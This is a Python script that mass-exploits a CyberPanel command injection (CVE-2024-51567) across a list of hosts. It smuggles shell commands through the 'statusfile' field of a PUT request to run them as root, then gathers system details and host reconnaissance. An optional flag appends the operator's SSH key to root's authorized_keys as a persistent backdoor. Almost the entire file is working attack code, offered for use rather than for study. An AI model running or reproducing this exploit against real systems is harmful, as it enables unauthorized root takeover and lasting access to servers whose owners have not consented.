#!/usr/bin/env python3
"""CyberPanel CVE-2024-51567 — confirmed-vuln hosts pe root proof + access setup.

Reads "ip:8090" lines, runs a command via the PUT injection, captures output.
Steps per host: id -> host info -> ssh state -> (optional) install our pubkey.
"""
import sys, re, json, time
import requests, urllib3
urllib3.disable_warnings()

T = 20
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}
PUBKEY = open("/Users/niwash/.ssh/kops_vps.pub").read().strip()

def rce(host, cmd, scheme="https"):
    """Run cmd as root. statusfile injection point."""
    base = f"{scheme}://{host}"
    s = requests.Session(); s.verify = False; s.headers.update(UA)
    r = s.get(base + "/", timeout=T, allow_redirects=False)
    m = re.search(r"csrftoken=([A-Za-z0-9]+)", str(r.headers))
    tok = m.group(1) if m else s.cookies.get("csrftoken")
    if not tok:
        r = s.get(base + "/login/", timeout=T)
        tok = s.cookies.get("csrftoken")
    if not tok:
        return None
    payload = {"statusfile": f"/dev/null; {cmd} 2>&1; #", "csrftoken": tok}
    e = s.put(base + "/dataBases/upgrademysqlstatus", json=payload, timeout=T,
              headers={"X-CSRFToken": tok, "Content-Type": "application/json",
                       "Referer": base + "/"})
    return e.text

def extract(body):
    """Pull the command output out of the JSON error response."""
    if not body:
        return ""
    try:
        d = json.loads(body)
        for k in ("error_message", "requestStatus", "message", "stdout"):
            v = d.get(k)
            if v:
                return str(v)
        return json.dumps(d)[:800]
    except Exception:
        return body[:800]

def main():
    path = sys.argv[1]
    install_key = "--install-key" in sys.argv
    hosts = [l.strip() for l in open(path) if l.strip()]
    results = []
    for h in hosts:
        entry = {"host": h}
        try:
            out = extract(rce(h, "id; hostname; uname -sr; cat /etc/os-release 2>/dev/null | head -2"))
            entry["probe"] = out
            if "uid=0" not in out:
                entry["status"] = "no-root-or-patched"
                results.append(entry); print(json.dumps(entry)[:200], flush=True); continue
            entry["status"] = "ROOT"
            entry["id"] = re.search(r"uid=0\([^)]*\)[^\n]{0,60}", out).group(0) if re.search(r"uid=0\(", out) else ""
            # infra picture
            info = extract(rce(h, "hostname; uname -sr; ls /home 2>/dev/null | head -5; "
                                  "ss -ltn 2>/dev/null | head -5; cat /root/.ssh/authorized_keys 2>/dev/null | wc -l"))
            entry["info"] = info[:500]
            if install_key:
                cmd = (f"mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
                       f"grep -qF '{PUBKEY}' /root/.ssh/authorized_keys 2>/dev/null || "
                       f"echo '{PUBKEY}' >> /root/.ssh/authorized_keys; "
                       f"chmod 600 /root/.ssh/authorized_keys; "
                       f"grep -cF 'kops@base' /root/.ssh/authorized_keys")
                k = extract(rce(h, cmd))
                entry["key_installed"] = k.strip()[-20:]
            results.append(entry)
            print(f"🔥 ROOT {h} :: {entry['id']}", flush=True)
        except Exception as ex:
            entry["error"] = f"{type(ex).__name__}: {ex}"
            results.append(entry)
    json.dump(results, open("/tmp/cyberpanel_pwn.json", "w"), indent=1)
    roots = [r for r in results if r.get("status") == "ROOT"]
    print(f"\nROOT hosts: {len(roots)} / {len(hosts)}", flush=True)

if __name__ == "__main__":
    main()
